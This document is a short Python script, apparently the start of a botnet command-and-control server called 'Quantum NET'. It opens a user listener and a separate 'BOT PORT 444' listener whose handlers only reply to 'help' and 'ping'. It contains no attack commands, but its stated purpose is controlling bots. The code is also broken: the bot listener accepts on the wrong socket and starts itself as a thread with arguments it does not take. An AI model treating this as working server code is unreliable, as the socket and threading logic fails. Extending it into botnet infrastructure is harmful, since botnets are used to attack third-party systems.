#
#
# @title: Quantum NET
# @since: 5/18/21
# @creator: Quantum Security Team (vl0b, Exo, clever, Max, Beta)
#
#

# Modules
import socket, sys, os, requests, time, threading, requests, random, datetime


buffer_length = 1024 # We Set The Buffer Over Here So It Can Be Reused So Use It Stop Typing 1024
host = "0.0.0.0"
port = random.randint(0, 65535)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((host, port))
sock.listen()


gg = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
gg.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
gg.bind((host, 444))
gg.listen()

print(f"[{datetime.datetime.now()}] | Quantum Started | {host} | {port} |") # Added Date And Time So You Can See When Was The Last Time The Net Started !
print(f"BOT PORT 444")

def handle_connection(client, addr):
        while(True):
                client.send("new: ".encode())
                data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")

                if data.lower() == "help" or data.lower() == "?":
                        client.send(str("working").encode())

def bot_handle(client, addr):
    while(True):
        client.send("new: ".encode())
        data = str(client.recv(buffer_length).decode()).strip().replace("\r\n", "")
        print(data)

        if data == "ping":
            client.send(str("ping").encode())

                        


def listener():
    while True:
        client, address = sock.accept()
        try:
            print("TCP Connection From " + address[0] + ":" + str(address[1]))
            threading.Thread(target=handle_connection, args=(client, address)).start()
        except:
            print("Client Disconnected!")

def bot_listener():
        while True:
                client, address = sock.accept()
                try:
                        print("TCP Connection From " + address[0] + ":" + str(address[1]))
                        threading.Thread(target=bot_listener, args=(client, address)).start()
                except:
                        print("Client Disconnected!")



threading.Thread(target=listener).start()
threading.Thread(target=bot_listener).start()